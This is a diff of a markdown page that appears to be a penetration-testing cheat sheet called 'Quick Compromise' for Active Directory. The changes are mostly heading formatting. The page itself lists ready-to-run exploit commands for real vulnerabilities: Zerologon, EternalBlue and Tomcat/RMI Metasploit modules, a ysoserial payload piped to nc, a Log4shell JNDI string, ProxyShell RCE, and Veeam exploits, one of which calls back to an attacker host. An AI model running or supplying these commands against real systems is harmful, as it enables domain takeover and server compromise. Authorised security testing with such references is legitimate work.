@@ -2,34 +2,35 @@
 title: "Quick Compromise"
 description: "Quick Compromise techniques and commands for Active Directory security assessment."
 ---
-## ⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@ >>> Domain admin
+# Quick Compromise
+## ⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@ *Domain admin*{: .highlight}
 - `zerologon-scan '<dc_netbios_name>' '<ip>'`
 - `cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>`
 
-## Eternal Blue MS17-010 @CVE@ >>> Admin || Low access
+## Eternal Blue MS17-010 @CVE@ *Admin || Low access*{: .highlight}
 - `msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only`
 
-## Tomcat/Jboss Manager >>> Admin || Low access
+## Tomcat/Jboss Manager *Admin || Low access*{: .highlight}
 - `msf> auxiliary/scanner/http/tomcat_enum`
 - `msf> exploit/multi/http/tomcat_mgr_deploy`
 
-## Java RMI >>> Admin || Low access
+## Java RMI *Admin || Low access*{: .highlight}
 - `msf> use exploit/multi/misc/java_rmi_server`
 
-## Java Serialiszed port >>> Admin || Low access
+## Java Serialiszed port *Admin || Low access*{: .highlight}
 - `ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>`
 
-## Log4shell >>> Admin || Low access
+## Log4shell *Admin || Low access*{: .highlight}
 - ${jndi:ldap://<ip>:<port>/o=reference}
 
-## Database >>> Admin || Low access
+## Database *Admin || Low access*{: .highlight}
 - `msf> use auxiliary/admin/mssql/mssql_enum_sql_logins`
 
-## Exchange >>> Admin
+## Exchange *Admin*{: .highlight}
 - Proxyshell @CVE@
   - `proxyshell_rce.py -u https://<exchange> -e administrator@<domain>`
 
-## Veeam >>> User Account || Low access || Admin
+## Veeam *User Account || Low access || Admin*{: .highlight}
 - CVE-2023-27532 (creds - Veeam backup) @CVE@
   - `VeeamHax.exe --target <veeam_server>`
   - `CVE-2023-27532 net.tcp:/<target>:<port>/`
@@ -40,7 +41,7 @@ description: "Quick Compromise techniques and commands for Active Directory secu
 - CVE-2024-40711 (unserialize - Veeam backup) @CVE@
   - `CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>`
 
-## GLPI >>> Admin || Low access
+## GLPI *Admin || Low access*{: .highlight}
 - CVE-2022-35914 @CVE@
   - /vendor/htmlawed/htmlawed/htmLawedTest.php
 - CVE_2023_41320 @CVE@
